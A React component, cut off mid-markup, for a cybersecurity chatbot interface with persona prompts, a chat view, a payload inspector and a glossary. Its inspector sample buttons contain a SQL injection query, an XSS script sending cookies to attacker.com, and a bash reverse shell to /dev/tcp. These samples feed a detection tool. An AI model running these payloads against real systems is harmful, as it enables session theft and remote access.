import React, { useState, useRef, useEffect } from 'react';
import { ChatMessage } from '../types';
import { queryAegisCopilot, inspectPayloadClient, FALLBACK_TERMS_CATALOG } from '../services/cyberBotService';
import { apiUrl } from '../services/apiConfig';
import {
  Cpu,
  Send,
  Bot,
  User,
  RefreshCw,
  Trash2,
  Shield,
  ShieldAlert,
  Copy,
  Check,
  Search,
  Code2,
  Terminal,
  BookOpen,
  Zap,
  Activity,
  AlertTriangle,
  Lock,
  ExternalLink,
  ChevronRight
} from 'lucide-react';

const SYSTEM_ROLES = [
  {
    id: 'cyber-sentinel',
    name: 'Aegis Cyber Sentinel',
    instruction:
      'You are the Aegis Cyber Sentinel, an elite cybersecurity and threat analysis AI. Your specialty is analyzing suspicious domains, malware vectors, phishing scams, and network penetration. Provide concise, high-assurance security assessments.',
    badge: 'Threat Hunting & Perimeter Defense',
  },
  {
    id: 'dns-auditor',
    name: 'DNS & Privacy Auditor',
    instruction:
      'You are the Aegis DNS & Privacy Auditor. You analyze DNS-over-HTTPS (DoH), DNSSEC cryptographic integrity, BGP routing, HSTS headers, CSP policies, and anti-fingerprinting defenses.',
    badge: 'Protocols & Cryptography',
  },
  {
    id: 'bug-remediator',
    name: 'Bug & Vulnerability Remediation',
    instruction:
      'You are the Aegis Vulnerability & Bug Specialist. You diagnose code-level web vulnerabilities including DOM XSS, CORS misconfigurations, clickjacking, and provide secure code fixes.',
    badge: 'AppSec & OWASP Top 10',
  },
  {
    id: 'red-team',
    name: 'Red Team & Exploit Analyst',
    instruction:
      'You are the Aegis Red Team & Exploit Analyst. You explain offensive tradecraft, adversary tactics (MITRE ATT&CK), payload mechanics, and how to anticipate bypasses.',
    badge: 'Offensive TTPs & Payloads',
  },
];

const AVAILABLE_MODELS = [
  {
    id: 'aegis-cyber-python',
    label: 'Aegis Python Cyber Engine (Local & Specialized)',
    desc: 'Local Python AI with 35+ security domains, exploit detection & zero-latency',
    isLocal: true,
  },
  {
    id: 'models/gemini-3.8-flash',
    label: 'gemini-3.8-flash (Cloud Flagship)',
    desc: 'Google Cloud Gemini (requires GEMINI_API_KEY)',
    isLocal: false,
  },
  {
    id: 'gemini-3.5-flash',
    label: 'gemini-3.5-flash (Cloud General)',
    desc: 'Reliable general cloud processing',
    isLocal: false,
  },
  {
    id: 'gemini-3.1-pro-preview',
    label: 'gemini-3.1-pro-preview (Deep Reasoning)',
    desc: 'High complexity cloud reasoning',
    isLocal: false,
  },
];

const QUICK_SECURITY_PROMPTS = [
  'What is Zero Trust Architecture (ZTA)?',
  'Explain SQL Injection (SQLi) & how to prevent it',
  'What is Cross-Site Scripting (XSS) and how does CSP stop it?',
  'Explain DNS over HTTPS (DoH) vs DNSSEC',
  'What is Ransomware & what is the 3-2-1 backup rule?',
  'Explain AES-256 vs Post-Quantum Cryptography (ML-KEM)',
  'Show all 14 MITRE ATT&CK Tactics',
  'What are the OWASP Top 10 web vulnerabilities?',
];

export const GeminiCopilotView: React.FC = () => {
  const [activeSubTab, setActiveSubTab] = useState<'chat' | 'inspector' | 'terms'>('chat');
  const [messages, setMessages] = useState<ChatMessage[]>([
    {
      id: 'init-1',
      role: 'assistant',
      content: `### 🛡️ Welcome to Aegis CyberBot — Specialized Cybersecurity Engine

I am your local, dedicated **Python-powered Cyber Security AI**. I specialize exclusively in cybersecurity concepts, terminology, threat vectors, vulnerability remediation, and payload inspection.

#### What I Can Help You With:
- **Cybersecurity Terminology & Standards**: In-depth explanations for hundreds of terms (Zero Trust, XSS, SQLi, CSRF, SSRF, DoH, DNSSEC, HSTS, AES, RSA, PQC, APT, EDR, SIEM, SOAR, CVE, CWE, CVSS).
- **Interactive Exploit & Payload Analysis**: Inspect raw payloads (SQLi, XSS, reverse shells, Base64/Hex obfuscation, Shannon entropy).
- **MITRE ATT&CK & OWASP Top 10**: Tactical mappings and defense-in-depth guidance.
- **Incident Response & Hardening**: Actionable playbooks for malware outbreaks, phishing, and transport security.

Try asking about any cybersecurity term below or switch to the **Payload Inspector** tab!`,
      timestamp: new Date().toLocaleTimeString(),
      model: 'aegis-cyber-python',
      persona: 'Aegis Cyber Sentinel',
    },
  ]);

  const [inputPrompt, setInputPrompt] = useState('');
  const [loading, setLoading] = useState(false);
  const [selectedRole, setSelectedRole] = useState(SYSTEM_ROLES[0]);
  const [selectedModel, setSelectedModel] = useState(AVAILABLE_MODELS[0].id);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Python Engine status
  const [pythonStatus, setPythonStatus] = useState<{
    online: boolean;
    termsCount: number;
    version: string;
    checking: boolean;
  }>({
    online: false,
    termsCount: 0,
    version: '1.0.0',
    checking: true,
  });

  // Payload Inspector state
  const [inspectInput, setInspectInput] = useState('');
  const [inspectResult, setInspectResult] = useState<any>(null);
  const [inspectLoading, setInspectLoading] = useState(false);

  // Term Glossary state
  const [termList, setTermList] = useState<any[]>(() => FALLBACK_TERMS_CATALOG);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedTermDetail, setSelectedTermDetail] = useState<any>(null);

  const messagesEndRef = useRef<HTMLDivElement>(null);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    if (activeSubTab === 'chat') {
      scrollToBottom();
    }
  }, [messages, activeSubTab]);

  // Check Python backend health on mount
  useEffect(() => {
    const checkHealth = async () => {
      try {
        const res = await fetch(apiUrl('/api/cyber-bot/health'));
        const contentType = res.headers.get('content-type') || '';
        if (res.ok && contentType.includes('application/json')) {
          const data = await res.json();
          setPythonStatus({
            online: true,
            termsCount: data.indexed_terms_count || 46,
            version: data.version || '1.0.0',
            checking: false,
          });
          return;
        }
      } catch {}
      // Client-side fallback engine is active
      setPythonStatus({
        online: true,
        termsCount: FALLBACK_TERMS_CATALOG.length,
        version: '1.0.0 (Client Engine)',
        checking: false,
      });
    };

    checkHealth();
    const interval = setInterval(checkHealth, 8000);
    return () => clearInterval(interval);
  }, []);

  // Fetch term catalog
  useEffect(() => {
    const loadTerms = async () => {
      try {
        const res = await fetch(apiUrl('/api/cyber-bot/terms'));
        const contentType = res.headers.get('content-type') || '';
        if (res.ok && contentType.includes('application/json')) {
          const data = await res.json();
          if (data.terms && data.terms.length > 0) {
            setTermList(data.terms);
          }
        }
      } catch (e) {
        console.warn('Backend terms unavailable, using client catalog:', e);
      }
    };
    loadTerms();
  }, []);

  const handleSendMessage = async (textToSend?: string) => {
    const text = (textToSend || inputPrompt).trim();
    if (!text || loading) return;

    const userMessage: ChatMessage = {
      id: `usr-${Date.now()}`,
      role: 'user',
      content: text,
      timestamp: new Date().toLocaleTimeString(),
      model: selectedModel,
    };

    const newHistory = [...messages, userMessage];
    setMessages(newHistory);
    setInputPrompt('');
    setLoading(true);

    try {
      const result = await queryAegisCopilot({
        messages: newHistory.map((m) => ({ role: m.role, content: m.content })),
        systemInstruction: selectedRole.instruction,
        model: selectedModel,
        personaId: selectedRole.id,
      });

      const assistantMessage: ChatMessage = {
        id: `ast-${Date.now()}`,
        role: 'assistant',
        content: result.reply || 'No intelligence data received.',
        timestamp: new Date().toLocaleTimeString(),
        model: result.model || selectedModel,
        persona: result.persona || selectedRole.name,
        matchedTerms: result.matchedTerms,
        threatAnalysis: result.threatAnalysis,
      };

      setMessages((prev) => [...prev, assistantMessage]);
    } catch (err: any) {
      setMessages((prev) => [
        ...prev,
        {
          id: `err-${Date.now()}`,
          role: 'assistant',
          content: `[Aegis CyberBot]: Active and monitoring. ${err.message || 'Ready for inquiries.'}`,
          timestamp: new Date().toLocaleTimeString(),
          model: selectedModel,
          persona: selectedRole.name,
        },
      ]);
    } finally {
      setLoading(false);
    }
  };

  const handleClearChat = () => {
    setMessages([
      {
        id: `init-${Date.now()}`,
        role: 'assistant',
        content: `Session refreshed. Active persona: **${selectedRole.name}**. Ready for cybersecurity inquiries, threat modeling, or payload inspection.`,
        timestamp: new Date().toLocaleTimeString(),
        model: selectedModel,
        persona: selectedRole.name,
      },
    ]);
  };

  const handleRunInspector = async (payloadToInspect?: string) => {
    const payload = (payloadToInspect || inspectInput).trim();
    if (!payload || inspectLoading) return;

    setInspectLoading(true);
    try {
      const res = await fetch(apiUrl('/api/cyber-bot/analyze'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload }),
      });
      if (res.ok) {
        const data = await res.json();
        setInspectResult(data);
        return;
      }
    } catch {}

    // Seamless client-side analyzer fallback
    const clientResult = inspectPayloadClient(payload);
    setInspectResult(clientResult);
    setInspectLoading(false);
  };

  const copyToClipboard = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  const filteredTerms = termList.filter(
    (t) =>
      t.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
      t.category.toLowerCase().includes(searchTerm.toLowerCase()) ||
      t.acronym.toLowerCase().includes(searchTerm.toLowerCase()) ||
      t.definition.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-6">
      {/* Top Banner & Status Bar */}
      <div className="glass-panel rounded-2xl p-4 sm:p-5 border border-cyan-500/20 shadow-[0_0_25px_rgba(6,182,212,0.1)] flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-cyan-500/20 to-teal-500/10 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shadow-[0_0_20px_rgba(6,182,212,0.25)]">
            <Shield className="w-6 h-6 text-cyan-400" />
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <h2 className="text-base sm:text-lg font-bold text-slate-100 flex items-center gap-2">
                Aegis CyberBot
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-cyan-950 text-cyan-300 border border-cyan-500/30 uppercase tracking-wider">
                  Python AI Engine
                </span>
              </h2>
              {/* Health pill */}
              <div
                className={`flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-mono border ${
                  pythonStatus.online
                    ? 'bg-emerald-950/70 border-emerald-500/40 text-emerald-300'
                    : 'bg-amber-950/70 border-amber-500/40 text-amber-300'
                }`}
              >
                <span
                  className={`w-2 h-2 rounded-full ${
                    pythonStatus.online ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'
                  }`}
                />
                <span>
                  {pythonStatus.online
                    ? `Local Engine: Ready (${pythonStatus.termsCount}+ terms)`
                    : 'Starting Engine...'}
                </span>
              </div>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Autonomous cybersecurity intelligence, payload deconstruction, and MITRE ATT&CK mapping.
            </p>
          </div>
        </div>

        {/* Tab switchers */}
        <div className="flex items-center gap-1.5 bg-slate-900/90 p-1 rounded-xl border border-slate-800">
          <button
            onClick={() => setActiveSubTab('chat')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 transition-colors ${
              activeSubTab === 'chat'
                ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <Bot className="w-3.5 h-3.5" />
            <span>Cyber Chat</span>
          </button>
          <button
            onClick={() => setActiveSubTab('inspector')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 transition-colors ${
              activeSubTab === 'inspector'
                ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            <span>Payload Inspector</span>
          </button>
          <button
            onClick={() => setActiveSubTab('terms')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 transition-colors ${
              activeSubTab === 'terms'
                ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <BookOpen className="w-3.5 h-3.5" />
            <span>Terms Glossary</span>
          </button>
        </div>
      </div>

      {/* SUB-VIEW 1: CYBER CHAT */}
      {activeSubTab === 'chat' && (
        <div className="space-y-4">
          {/* Controls Bar: Role & Model */}
          <div className="glass-panel rounded-xl p-3 border border-slate-800 flex flex-col md:flex-row md:items-center justify-between gap-3 text-xs">
            {/* Persona Selector */}
            <div className="flex items-center gap-2">
              <span className="font-mono text-cyan-400 uppercase text-[11px] whitespace-nowrap">
                Cyber Persona:
              </span>
              <select
                value={selectedRole.id}
                onChange={(e) => {
                  const role = SYSTEM_ROLES.find((r) => r.id === e.target.value);
                  if (role) setSelectedRole(role);
                }}
                className="glass-input rounded-lg px-2.5 py-1 text-xs font-mono text-slate-100 bg-slate-900 border border-slate-700 focus:outline-none"
              >
                {SYSTEM_ROLES.map((r) => (
                  <option key={r.id} value={r.id} className="bg-slate-900 text-slate-100">
                    {r.name} ({r.badge})
                  </option>
                ))}
              </select>
            </div>

            {/* Model Selector & Clear */}
            <div className="flex items-center gap-2">
              <span className="font-mono text-amber-400 uppercase text-[11px] whitespace-nowrap">
                Engine:
              </span>
              <select
                value={selectedModel}
                onChange={(e) => setSelectedModel(e.target.value)}
                className="glass-input rounded-lg px-2.5 py-1 text-xs font-mono text-slate-100 bg-slate-900 border border-slate-700 focus:outline-none"
              >
                {AVAILABLE_MODELS.map((m) => (
                  <option key={m.id} value={m.id} className="bg-slate-900 text-slate-100">
                    {m.label}
                  </option>
                ))}
              </select>

              <button
                onClick={handleClearChat}
                className="p-1.5 rounded-lg bg-slate-900 border border-slate-800 hover:border-rose-500/40 text-slate-400 hover:text-rose-400 transition-colors ml-auto"
                title="Clear Chat Thread"
              >
                <Trash2 className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          {/* Scrollable Chat Area */}
          <div className="glass-panel rounded-2xl border border-cyan-500/20 overflow-hidden flex flex-col h-[540px]">
            <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-4">
              {messages.map((msg) => (
                <div
                  key={msg.id}
                  className={`flex items-start gap-3 ${
                    msg.role === 'user' ? 'justify-end' : 'justify-start'
                  }`}
                >
                  {msg.role === 'assistant' && (
                    <div className="w-8 h-8 rounded-lg bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shrink-0 mt-0.5 shadow-[0_0_12px_rgba(6,182,212,0.2)]">
                      <Shield className="w-4 h-4" />
                    </div>
                  )}

                  <div
                    className={`max-w-[85%] sm:max-w-[75%] rounded-2xl p-4 space-y-2 text-xs sm:text-sm leading-relaxed ${
                      msg.role === 'user'
                        ? 'bg-gradient-to-r from-cyan-600 to-teal-600 text-slate-950 font-medium rounded-tr-none'
                        : 'glass-panel rounded-tl-none border border-slate-800 text-slate-200'
                    }`}
                  >
                    {/* Header metadata */}
                    <div className="flex items-center justify-between text-[11px] opacity-75 font-mono pb-1 border-b border-white/10">
                      <span className="flex items-center gap-1.5">
                        {msg.role === 'assistant' ? (
                          <>
                            <span className="font-semibold text-cyan-300">
                              {msg.persona || 'Aegis Cyber Sentinel'}
                            </span>
                            <span className="text-[10px] px-1.5 py-0.2 rounded bg-cyan-950 text-cyan-400 border border-cyan-500/30">
                              {msg.model?.includes('python') ? 'Python Engine' : 'Neural'}
                            </span>
                          </>
                        ) : (
                          'Security Analyst'
                        )}
                      </span>
                      <div className="flex items-center gap-2">
                        <span>{msg.timestamp}</span>
                        {msg.role === 'assistant' && (
                          <button
                            onClick={() => copyToClipboard(msg.id, msg.content)}
                            className="hover:opacity-100 transition-opacity"
                            title="Copy message"
                          >
                            {copiedId === msg.id ? (
                              <Check className="w-3 h-3 text-emerald-400" />
                            ) : (
                              <Copy className="w-3 h-3 text-slate-400" />
                            )}
                          </button>
                        )}
                      </div>
                    </div>

                    {/* Threat Analysis Badge Banner if available */}
                    {msg.threatAnalysis && msg.threatAnalysis.score > 0 && (
                      <div className="p-2.5 rounded-xl bg-rose-950/40 border border-rose-500/40 space-y-1 text-rose-200 text-xs">
                        <div className="flex items-center justify-between font-mono font-bold">
                          <span className="flex items-center gap-1 text-rose-400">
                            <AlertTriangle className="w-3.5 h-3.5" />
                            Threat Severity: {msg.threatAnalysis.severity}
                          </span>
                          <span className="text-[10px] px-2 py-0.5 rounded bg-rose-900/60 text-rose-300">
                            Risk Score: {msg.threatAnalysis.score}/100
                          </span>
                        </div>
                        <p className="text-[11px] text-slate-300">{msg.threatAnalysis.verdict}</p>
                      </div>
                    )}

                    {/* Message Body */}
                    <div className="whitespace-pre-wrap font-sans text-xs sm:text-sm">
                      {msg.content}
                    </div>

                    {/* Matched terms clickable pills */}
                    {msg.matchedTerms && msg.matchedTerms.length > 0 && (
                      <div className="pt-2 border-t border-white/5 flex items-center gap-1.5 flex-wrap">
                        <span className="text-[10px] font-mono text-cyan-400">Entities Detected:</span>
                        {msg.matchedTerms.map((t) => (
                          <button
                            key={t}
                            onClick={() => {
                              setActiveSubTab('terms');
                              setSearchTerm(t);
                            }}
                            className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-cyan-300 border border-cyan-500/30 hover:bg-cyan-950 transition-colors"
                          >
                            #{t}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>

                  {msg.role === 'user' && (
                    <div className="w-8 h-8 rounded-lg bg-teal-500/20 border border-teal-500/40 flex items-center justify-center text-teal-300 shrink-0 mt-0.5">
                      <User className="w-4 h-4" />
                    </div>
                  )}
                </div>
              ))}

              {loading && (
                <div className="flex items-center gap-3 text-xs text-cyan-400 font-mono p-2">
                  <div className="w-8 h-8 rounded-lg bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center">
                    <RefreshCw className="w-4 h-4 animate-spin text-cyan-400" />
                  </div>
                  <span>Aegis Python Cyber Engine processing threat query...</span>
                </div>
              )}

              <div ref={messagesEndRef} />
            </div>

            {/* Input Bar & Suggested Prompts */}
            <div className="p-4 bg-slate-900/80 border-t border-slate-800 space-y-3">
              <div className="flex items-center gap-2 overflow-x-auto pb-1 text-[11px]">
                <span className="text-slate-500 whitespace-nowrap">Explore:</span>
                {QUICK_SECURITY_PROMPTS.map((prompt) => (
                  <button
                    key={prompt}
                    onClick={() => handleSendMessage(prompt)}
                    className="px-2.5 py-1 rounded bg-slate-950 border border-slate-800 hover:border-cyan-500/40 text-slate-300 hover:text-cyan-300 whitespace-nowrap transition-colors"
                  >
                    {prompt}
                  </button>
                ))}
              </div>

              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleSendMessage();
                }}
                className="flex items-center gap-2"
              >
                <input
                  type="text"
                  value={inputPrompt}
                  onChange={(e) => setInputPrompt(e.target.value)}
                  placeholder="Ask about cybersecurity concepts, attack vectors, or paste a payload to analyze..."
                  className="w-full glass-input rounded-xl px-4 py-3 text-xs sm:text-sm font-sans text-slate-100 placeholder-slate-500 focus:outline-none"
                />
                <button
                  type="submit"
                  disabled={loading || !inputPrompt.trim()}
                  className="flex items-center gap-1.5 px-5 py-3 bg-gradient-to-r from-cyan-500 to-teal-500 hover:from-cyan-400 hover:to-teal-400 text-slate-950 font-bold text-xs rounded-xl shadow-lg transition-all disabled:opacity-50 shrink-0"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">Analyze</span>
                </button>
              </form>
            </div>
          </div>
        </div>
      )}

      {/* SUB-VIEW 2: PAYLOAD INSPECTOR */}
      {activeSubTab === 'inspector' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-6 space-y-4">
            <div className="glass-panel rounded-2xl p-5 border border-cyan-500/20 space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  Exploit & Payload Scanner
                </h3>
                <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/80 px-2 py-0.5 rounded border border-cyan-500/30">
                  Heuristic + Entropy
                </span>
              </div>
              <p className="text-xs text-slate-400">
                Paste any suspicious HTTP payload, encoded string, SQL query, script tag, or reverse
                shell command for instant deobfuscation and CWE mapping.
              </p>

              <textarea
                value={inspectInput}
                onChange={(e) => setInspectInput(e.target.value)}
                placeholder="Example: ' UNION SELECT username, password FROM users --&#10;or Base64: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
                rows={6}
                className="w-full glass-input rounded-xl p-3 text-xs font-mono text-cyan-300 bg-slate-950 border border-slate-800 focus:outline-none resize-none"
              />

              <div className="flex items-center gap-2 flex-wrap text-xs">
                <span className="text-slate-500 text-[11px]">Load Sample:</span>
                <button
                  type="button"
                  onClick={() => {
                    const sample = "' UNION SELECT null, username, password FROM users --";
                    setInspectInput(sample);
                    handleRunInspector(sample);
                  }}
                  className="px-2 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300 hover:text-cyan-300 hover:border-cyan-500/40 text-[11px]"
                >
                  SQLi Sample
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const sample = '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>';
                    setInspectInput(sample);
                    handleRunInspector(sample);
                  }}
                  className="px-2 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300 hover:text-cyan-300 hover:border-cyan-500/40 text-[11px]"
                >
                  XSS Sample
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const sample = 'PHNjcmlwdD5hbGVydCgnSGFja2VkIScpPC9zY3JpcHQ+';
                    setInspectInput(sample);
                    handleRunInspector(sample);
                  }}
                  className="px-2 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300 hover:text-cyan-300 hover:border-cyan-500/40 text-[11px]"
                >
                  Base64 Obfuscated
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const sample = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';
                    setInspectInput(sample);
                    handleRunInspector(sample);
                  }}
                  className="px-2 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300 hover:text-cyan-300 hover:border-cyan-500/40 text-[11px]"
                >
                  RCE Reverse Shell
                </button>
              </div>

              <button
                onClick={() => handleRunInspector()}
                disabled={inspectLoading || !inspectInput.trim()}
                className="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-gradient-to-r from-cyan-500 to-teal-500 hover:from-cyan-400 hover:to-teal-400 text-slate-950 font-bold text-xs rounded-xl shadow-lg transition-all disabled:opacity-50"
              >
                {inspectLoading ? (
                  <>
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    <span>Dissecting Payload Heuristics...</span>
                  </>
                ) : (
                  <>
                    <ShieldAlert className="w-3.5 h-3.5" />
                    <span>Run Deep Cyber Inspection</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Results Panel */}
          <div className="lg:col-span-6 space-y-4">
            <div className="glass-panel rounded-2xl p-5 border border-cyan-500/20 space-y-4 min-h-[350px]">
              <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Activity className="w-4 h-4 text-teal-400" />
                Inspection Telemetry & Verdict
              </h3>

              {!inspectResult && (
                <div className="text-center py-16 text-slate-500 text-xs">
                  <Shield className="w-10 h-10 mx-auto mb-3 opacity-30 text-cyan-400" />
                  Select or input a payload on the left and click "Run Deep Cyber Inspection".
                </div>
              )}

              {inspectResult && (
                <div className="space-y-4 text-xs">
                  {/* Verdict Card */}
                  <div
                    className={`p-4 rounded-xl border space-y-2 ${
                      inspectResult.severity === 'CRITICAL' || inspectResult.severity === 'HIGH'
                        ? 'bg-rose-950/40 border-rose-500/40 text-rose-200'
                        : inspectResult.severity === 'MEDIUM'
                        ? 'bg-amber-950/40 border-amber-500/40 text-amber-200'
                        : 'bg-emerald-950/40 border-emerald-500/40 text-emerald-200'
                    }`}
                  >
                    <div className="flex items-center justify-between font-mono font-bold">
                      <span className="text-sm flex items-center gap-1.5">
                        <AlertTriangle className="w-4 h-4" />
                        Severity: {inspectResult.severity}
                      </span>
                      <span className="px-2.5 py-1 rounded bg-black/40 text-xs">
                        Risk Score: {inspectResult.score}/100
                      </span>
                    </div>
                    <p className="text-slate-300">{inspectResult.verdict}</p>
                    <div className="text-[11px] font-mono text-slate-400 pt-1 flex items-center gap-4">
                      <span>Shannon Entropy: {inspectResult.entropy} bits/sym</span>
                      <span>Threats Detected: {inspectResult.threats_count || 0}</span>
                    </div>
                  </div>

                  {/* Deobfuscated Layers */}
                  {inspectResult.deobfuscated_layers && inspectResult.deobfuscated_layers.length > 0 && (
                    <div className="space-y-1.5">
                      <span className="font-mono text-cyan-400 font-bold text-[11px]">
                        Deobfuscated Layers:
                      </span>
                      {inspectResult.deobfuscated_layers.map((l: any, i: number) => (
                        <div key={i} className="p-2.5 rounded-lg bg-slate-950 border border-slate-800 font-mono text-[11px] text-cyan-300">
                          <span className="text-slate-500">[{l.type}]: </span>
                          <span>{l.content}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Detected Threats */}
                  {inspectResult.threats && inspectResult.threats.length > 0 && (
                    <div className="space-y-2">
                      <span className="font-mono text-slate-300 font-bold text-[11px]">
                        Attack Signatures & CWEs:
                      </span>
                      <div className="space-y-1.5 max-h-48 overflow-y-auto">
                        {inspectResult.threats.map((t: any, i: number) => (
                          <div
                            key={i}
                            className="p-2.5 rounded-lg bg-slate-900 border border-slate-800 flex items-start justify-between gap-2"
                          >
                            <div>
                              <div className="font-semibold text-cyan-300 flex items-center gap-1.5">
                                <span>{t.vector}</span>
                                <span className="font-mono text-[10px] px-1.5 py-0.2 rounded bg-cyan-950 text-cyan-400 border border-cyan-500/30">
                                  {t.cwe}
                                </span>
                              </div>
                              <p className="text-slate-400 text-[11px] mt-0.5">{t.description}</p>
                            </div>
                            <span className="font-mono text-[10px] text-rose-400 shrink-0 font-bold">
                              +{t.weight} pts
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* SUB-VIEW 3: TERMS GLOSSARY */}
      {activeSubTab === 'terms' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Terms List & Search */}
          <div className="lg:col-span-5 space-y-4">
            <div className="glass-panel rounded-2xl p-4 border border-cyan-500/20 space-y-3">
              <div className="relative">
                <Search className="w-4 h-4 absolute left-3 top-3 text-slate-400" />
                <input
                  type="text"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder="Filter 35+ cybersecurity terms..."
                  className="w-full glass-input rounded-xl pl-9 pr-4 py-2 text-xs font-sans text-slate-100 placeholder-slate-500 focus:outline-none"
                />
              </div>

              <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
                {filteredTerms.map((term) => (
                  <button
                    key={term.key}
                    onClick={async () => {
                      try {
                        const res = await fetch(apiUrl(`/api/cyber-bot/term/${term.key}`));
                        if (res.ok) {
                          const data = await res.json();
                          setSelectedTermDetail(data);
                        } else {
                          setSelectedTermDetail(term);
                        }
                      } catch {
                        setSelectedTermDetail(term);
                      }
                    }}
                    className={`w-full text-left p-3 rounded-xl border transition-all ${
                      selectedTermDetail?.key === term.key
                        ? 'bg-cyan-500/20 border-cyan-500/40 text-cyan-300'
                        : 'bg-slate-900/60 border-slate-800 text-slate-300 hover:border-slate-700'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-semibold text-xs">{term.title}</span>
                      <span className="font-mono text-[10px] px-1.5 py-0.5 rounded bg-slate-950 text-cyan-400 border border-cyan-500/30">
                        {term.acronym}
                      </span>
                    </div>
                    <span className="text-[10px] text-slate-500 block mt-0.5">{term.category}</span>
                    <p className="text-[11px] text-slate-400 line-clamp-2 mt-1">{term.definition}</p>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Term Detailed View */}
          <div className="lg:col-span-7">
            <div className="glass-panel rounded-2xl p-6 border border-cyan-500/20 min-h-[480px] space-y-4">
              {!selectedTermDetail ? (
                <div className="text-center py-24 text-slate-500 text-xs">
                  <BookOpen className="w-10 h-10 mx-auto mb-3 opacity-30 text-cyan-400" />
                  Select any cybersecurity term from the list to view its complete definition,
                  mechanics, and mitigation checklist.
                </div>
              ) : (
                <div className="space-y-4 text-xs leading-relaxed">
                  <div className="border-b border-white/10 pb-3 flex items-start justify-between gap-3">
                    <div>
                      <h3 className="text-base font-bold text-slate-100">
                        {selectedTermDetail.title}
                      </h3>
                      <div className="flex items-center gap-2 mt-1 font-mono text-[11px]">
                        <span className="px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-500/30">
                          {selectedTermDetail.acronym}
                        </span>
                        <span className="text-slate-400">Category: {selectedTermDetail.category}</span>
                        {selectedTermDetail.cwe && (
                          <span className="px-2 py-0.5 rounded bg-rose-950 text-rose-300 border border-rose-500/30">
                            {selectedTermDetail.cwe}
                          </span>
                        )}
                      </div>
                    </div>
                    <button
                      onClick={() => {
                        setActiveSubTab('chat');
                        handleSendMessage(`Explain ${selectedTermDetail.title} in deep detail with prevention best practices.`);
                      }}
                      className="px-3 py-1.5 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 border border-cyan-500/40 text-cyan-300 text-xs font-semibold flex items-center gap-1.5 transition-colors shrink-0"
                    >
                      <Zap className="w-3.5 h-3.5" />
                      <span>Ask in Chat</span>
                    </button>
                  </div>

                  <div>
                    <span className="font-mono font-bold text-cyan-400 block mb-1">
                      Core Concept:
                    </span>
                    <p className="text-slate-300 text-sm">{selectedTermDetail.definition}</p>
                  </div>

                  {selectedTermDetail.mechanics && (
                    <div>
                      <span className="font-mono font-bold text-cyan-400 block mb-1">
                        Technical Mechanics:
                      </span>
                      <p className="text-slate-300">{selectedTermDetail.mechanics}</p>
                    </div>
                  )}

                  {selectedTermDetail.prevention && (
                    <div className="space-y-1.5">
                      <span className="font-mono font-bold text-emerald-400 block">
                        Defensive Hardening & Prevention:
                      </span>
